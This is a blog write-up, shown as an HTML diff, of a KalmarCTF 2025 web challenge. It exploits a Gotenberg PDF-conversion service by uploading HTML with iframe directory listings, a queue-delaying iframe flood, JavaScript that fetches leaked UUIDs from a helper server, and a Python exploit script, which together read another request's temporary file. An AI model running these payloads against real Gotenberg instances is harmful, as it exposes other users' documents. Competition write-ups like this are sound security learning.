@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>KalmarCTF 2025 Web G0tchaberg Writeup | cjxol.com</title>
+<meta name="generator" content="Jekyll v3.8.7" />
+<meta property="og:title" content="KalmarCTF 2025 Web G0tchaberg Writeup" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="The Challenge" />
+<meta property="og:description" content="The Challenge" />
+<link rel="canonical" href="https://www.cjxol.com/posts/kalmar-ctf-2025-web-g0tchaberg-writeup/" />
+<meta property="og:url" content="https://www.cjxol.com/posts/kalmar-ctf-2025-web-g0tchaberg-writeup/" />
+<meta property="og:site_name" content="cjxol.com" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-03-09T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="KalmarCTF 2025 Web G0tchaberg Writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-03-09T00:00:00+00:00","datePublished":"2025-03-09T00:00:00+00:00","description":"The Challenge","headline":"KalmarCTF 2025 Web G0tchaberg Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.cjxol.com/posts/kalmar-ctf-2025-web-g0tchaberg-writeup/"},"url":"https://www.cjxol.com/posts/kalmar-ctf-2025-web-g0tchaberg-writeup/"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="https://www.cjxol.com/feed.xml" title="cjxol.com" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">cjxol.com</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">KalmarCTF 2025 Web G0tchaberg Writeup</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2025-03-09T00:00:00+00:00" itemprop="datePublished">Mar 9, 2025
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <h1 id="the-challenge">The Challenge</h1>
+
+<p>This challenge involved a bot periodically sending an HTML file containing the flag to a <a href="https://gotenberg.dev/">gotenberg</a> instance, which converts it to a PDF.. The version of gotenberg was the latest at the time of the CTF, 8.17.3.</p>
+
+<p>The process runs continuously:</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do
+    </span>curl <span class="nt">-s</span> <span class="s1">'http://gotenberg:3000/forms/chromium/convert/html'</span> <span class="nt">--form</span> <span class="s1">'files=@"index.html"'</span> <span class="nt">-o</span> ./output.pdf
+    <span class="nb">sleep </span>5
+<span class="k">done</span>
+</code></pre></div></div>
+
+<h1 id="tracing-down-the-flag">Tracing Down the Flag</h1>
+
+<p>Our goal is to extract the flag by interacting with the gotenberg instance.</p>
+
+<p>With some <a href="https://github.com/gotenberg/gotenberg/blob/85eaef05ad0cf60917cd234f72433bcf85ef2f27/pkg/modules/chromium/routes.go">source code</a>.
+) and experiments, I found that while a request is being processed:</p>
+<ul>
+  <li>The uploaded HTML file is stored in <code class="highlighter-rouge">/tmp/[UUID_A]/[UUID_B]/index.html</code>.</li>
+  <li>The generated PDF file is saved in <code class="highlighter-rouge">/tmp/[UUID_A]/[UUID_B]/[UUID_C].pdf</code>.</li>
+  <li><code class="highlighter-rouge">UUID_A</code> remains constant, but <code class="highlighter-rouge">UUID_B</code> is unique per request.</li>
+  <li>Files are deleted once processing is complete.</li>
+</ul>
+
+<p>Since the flag is stored temporarily, I needed a way to access it before it was deleted.</p>
+
+<h1 id="leaking-directory-paths">Leaking Directory Paths</h1>
+
+<p>With iframe, it is possible to leak the content of another file on the server, or list the directory if the directory does not contain an <code class="highlighter-rouge">index.html</code> file. (I had to use relative path, somehow I could not get e.g. <code class="highlighter-rouge">file:///etc/passwd</code> to work, possibly due to browser security restrictions or I did something wrong).</p>
+
+<p>With the simple payload, I was about to leak the temporary file locations:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"../"</span> <span class="na">width=</span><span class="s">"1000px"</span> <span class="na">height=</span><span class="s">"1000px"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
+</code></pre></div></div>
+
+<p><img src="/assets/image/kalmar-ctf-2025-web-g0tchaberg-writeup/leak-directory.png" alt="Screenshot of the PDF content of the leaked temporary directory" /></p>
+
+<p>However, the flag files are deleted after the request is processed, I still need to find a way to get around this.</p>
+
+<h1 id="make-the-flag-stay-longer">Make the Flag Stay Longer</h1>
+
+<p>Reading the <a href="https://gotenberg.dev/docs/configuration#chromium">docs</a> of gotenberg, it runs a <strong>single</strong> Chromium instance, meaning the subsequent requests are queued while one is being processed. If the instance is busy, the subsequent uploaded HTML will be kept on the server until it is processed.</p>
+
+<p>I created a large HTML files containing many iframes to make PDF rendering take some time (more than 5 seconds), and the last iframe lists the directory to the HTML file containing the flag.</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"../../"</span> <span class="na">width=</span><span class="s">"1000px"</span> <span class="na">height=</span><span class="s">"100px"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
+(800 of the same iframes)
+<span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"../../"</span> <span class="na">width=</span><span class="s">"1000px"</span> <span class="na">height=</span><span class="s">"100px"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
+<span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"../"</span> <span class="na">width=</span><span class="s">"1000px"</span> <span class="na">height=</span><span class="s">"1000px"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
+</code></pre></div></div>
+
+<p><img src="/assets/image/kalmar-ctf-2025-web-g0tchaberg-writeup/leak-directory2.png" alt="Screenshot of the PDF content of the leaked temporary directory with 2 subdirectories" /></p>
+
+<p>In the example, it listed the directory of <code class="highlighter-rouge">/tmp/dfbe2bb7-e1ca-4cb4-ac55-f84aff6cd7dc/</code>, which contains two subdirectories <code class="highlighter-rouge">3118c7b5-0d4d-4317-afb5-90e216d5c1ce</code> and <code class="highlighter-rouge">5e1a4e83-99c3-4183-9967-842fa3c24fe3</code>. One of them is for the current request, and the other is for the flag queued afterwards. Say <code class="highlighter-rouge">5e1a4e83-99c3-4183-9967-842fa3c24fe3</code> is for the flag, the HTML file containing the flag is in <code class="highlighter-rouge">/tmp/dfbe2bb7-e1ca-4cb4-ac55-f84aff6cd7dc/5e1a4e83-99c3-4183-9967-842fa3c24fe3/index.html</code>.</p>
+
+<h1 id="get-the-flag">Get the Flag</h1>
+
+<p>Once I knew the flag’s location, I needed a way to read it before deletion. However, simply requesting the path would fail since files are deleted before the next request.</p>
+
+<h2 id="using-javascript-for-dynamic-fetching">Using JavaScript for Dynamic Fetching</h2>
+
+<p>JavaScript is executed on the Chromium instance, so I created a payload that dynamically fetches the leaked path and loads it into an iframe.</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+  <span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"../"</span> <span class="na">width=</span><span class="s">"1000px"</span> <span class="na">height=</span><span class="s">"200px"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
+  (49 of the same iframes)
+  <span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"../"</span> <span class="na">width=</span><span class="s">"1000px"</span> <span class="na">height=</span><span class="s">"200px"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
+  <span class="nt">&lt;script&gt;</span>
+    <span class="nx">fetch</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://example.com/uuids</span><span class="dl">'</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">response</span> <span class="o">=&gt;</span> <span class="nx">response</span><span class="p">.</span><span class="nx">json</span><span class="p">()).</span><span class="nx">then</span><span class="p">(</span><span class="nx">data</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="kd">const</span> <span class="nx">uuids</span> <span class="o">=</span> <span class="p">[</span><span class="nx">data</span><span class="p">.</span><span class="nx">uuids</span><span class="p">[</span><span class="mi">0</span><span class="p">]];</span>
+      <span class="nx">uuids</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">uuid</span> <span class="o">=&gt;</span> <span class="p">{</span>
+        <span class="kd">const</span> <span class="nx">iframe</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">);</span>
+        <span class="nx">iframe</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="s2">`../</span><span class="p">${</span><span class="nx">uuid</span><span class="p">}</span><span class="s2">/index.html`</span><span class="p">;</span>
+        <span class="nx">iframe</span><span class="p">.</span><span class="nx">width</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">1000px</span><span class="dl">'</span><span class="p">;</span>
+        <span class="nx">iframe</span><span class="p">.</span><span class="nx">height</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">200px</span><span class="dl">'</span><span class="p">;</span>
+        <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">iframe</span><span class="p">);</span>
+      <span class="p">})</span>
+    <span class="p">})</span>
+  <span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>In the payload, I also put a lot of iframes to make the JavaScript to have enough time to run. The server returns all of the directories listed, and it should contain the directory containing the flag, as well as the that request. As that request is processed first, and that directory will no longer exist, having an iframe with that path will make the PDF rendering fail, so I only take one of the UUIDs and hope it is the one containing the flag, thus it takes several attempts to get the flag.</p>
+
+<h1 id="final-payload">Final Payload</h1>
+
+<p>To time the exploit correctly, I automate the process with a Python script, which also automatically serves the leaked paths through HTTP.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">signal</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span>
+<span class="kn">from</span> <span class="nn">flask_cors</span> <span class="kn">import</span> <span class="n">CORS</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">threading</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">re</span>
+
+<span class="n">instance_address</span> <span class="o">=</span> <span class="s">'http://localhost:8642'</span>
+<span class="n">instance_address</span> <span class="o">=</span> <span class="s">'https://7a70d65746ee40ceb53f099a7429b4d5-50133.inst3.chal-kalmarc.tf'</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
+<span class="n">CORS</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>
+
+<span class="n">uuids</span> <span class="o">=</span> <span class="p">[]</span>
+
+<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/uuids'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">return_uuids</span><span class="p">():</span>
+    <span class="k">return</span> <span class="p">{</span><span class="s">'uuids'</span><span class="p">:</span> <span class="n">uuids</span><span class="p">}</span>
+
+<span class="k">def</span> <span class="nf">upload</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span>
+        <span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">instance_address</span><span class="si">}</span><span class="s">/forms/chromium/convert/html'</span><span class="p">,</span>
+        <span class="n">files</span><span class="o">=</span><span class="p">{</span>
+            <span class="s">'files'</span><span class="p">:</span> <span class="p">(</span><span class="s">'index.html'</span><span class="p">,</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)),</span>
+        <span class="p">},</span>
+    <span class="p">)</span>
+    <span class="k">return</span> <span class="n">r</span>
+
+<span class="k">def</span> <span class="nf">signal_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">run_flask</span><span class="p">():</span>
+    <span class="n">app</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">use_reloader</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">run_upload_payload1</span><span class="p">():</span>
+    <span class="k">global</span> <span class="n">uuids</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'Uploading payload1.html'</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="nb">file</span> <span class="o">=</span> <span class="n">upload</span><span class="p">(</span><span class="s">'payload1.html'</span><span class="p">).</span><span class="n">content</span>
+    <span class="n">uuid_pattern</span> <span class="o">=</span> <span class="sa">rb</span><span class="s">'\b[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[1-5][0-9a-fA-F]{3}-[89ABab][0-9a-fA-F]{3}-[0-9a-fA-F]{12}/[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[1-5][0-9a-fA-F]{3}-[89ABab][0-9a-fA-F]{3}-[0-9a-fA-F]{12}\b'</span>
+    <span class="n">uuids</span> <span class="o">=</span> <span class="p">[</span><span class="n">uuid</span><span class="p">.</span><span class="n">decode</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="s">'/'</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="k">for</span> <span class="n">uuid</span> <span class="ow">in</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="n">uuid_pattern</span><span class="p">,</span> <span class="nb">file</span><span class="p">)]</span> <span class="c1"># extract directories from the PDF
+</span>    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">uuids</span><span class="o">=</span><span class="si">}</span><span class="s">'</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">run_upload_payload1_again</span><span class="p">():</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'Uploading payload1.html again'</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="n">upload</span><span class="p">(</span><span class="s">'payload1.html'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">upload_payload2</span><span class="p">():</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'Uploading payload2.html'</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">upload</span><span class="p">(</span><span class="s">'payload2.html'</span><span class="p">).</span><span class="n">content</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">signal_handler</span><span class="p">)</span>
+
+    <span class="n">flask_thread</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">run_flask</span><span class="p">,</span> <span class="n">daemon</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="n">flask_thread</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
+
+    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    
+    <span class="c1"># upload payload 1
+</span>    <span class="n">upload_payload1_thread</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">run_upload_payload1</span><span class="p">)</span>
+    <span class="n">upload_payload1_thread</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
+
+    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+
+    <span class="c1"># upload payload 1 again to delay the server (not sure if necessary)
+</span>    <span class="n">upload_payload1_again_thread</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">run_upload_payload1_again</span><span class="p">)</span>
+    <span class="n">upload_payload1_again_thread</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
+
+    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1"># make sure payload 2 is finishes upload after the first two requests as payload 1 is much larger
+</span>
+    <span class="c1"># upload payload 2
+</span>    <span class="n">pdf</span> <span class="o">=</span> <span class="n">upload_payload2</span><span class="p">()</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'flag.pdf'</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">pdf</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'Written to flag.pdf'</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Flag: <code class="highlighter-rouge">kalmar{g0tcha!_well_done_that_was_fun_wasn't_it?_we_would_appreciate_if_you_create_a_ticket_with_your_solution}</code></p>
+
+<p><img src="/assets/image/kalmar-ctf-2025-web-g0tchaberg-writeup/flag.png" alt="Screenshot of exported PDF of the flag contained in an iframe" /></p>
+
+<h2 id="solution-summary">Solution summary</h2>
+
+<p>Since there is only one chromium instance</p>
+
+<p>I uploaded a HTML with a lot of iframes, with the last iframe <code class="highlighter-rouge">../</code> to leak the UUID when the bot uploads</p>
+
+<p>I upload another of the same file immediately just to delay the process of the next request (not sure if necessary)</p>
+
+<p>I upload another HTML with some iframes to give time for JS to run, with JS to load UUIDs from an endpoint set to UUIDs leaked and take a random of the (hopefully) 4 UUIDs returned from the endpoint and hoping it is the flag one, and append a iframe <code class="highlighter-rouge">../${uuid}/index.html</code></p>
+
+<h1 id="afterthought">Afterthought</h1>
+
+<p>After the CTF when I was browsing through the CTF Discord chat, I realised that instead of having a lot of iframes to delay the rendering I could have used <a href="https://gotenberg.dev/docs/routes#wait-before-rendering-chromium"><code class="highlighter-rouge">waitDelay</code> and <code class="highlighter-rouge">waitForExpression</code></a> to control the time delay and JavaScript completion which would have been more reliable and a lot easier.</p>
+
+  </div><a class="u-url" href="/posts/kalmar-ctf-2025-web-g0tchaberg-writeup/" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">cjxol.com</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">cjxol.com</li><li><a class="u-email" href="mailto:i@cjxol.com">i@cjxol.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/allc"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">allc</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p></p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
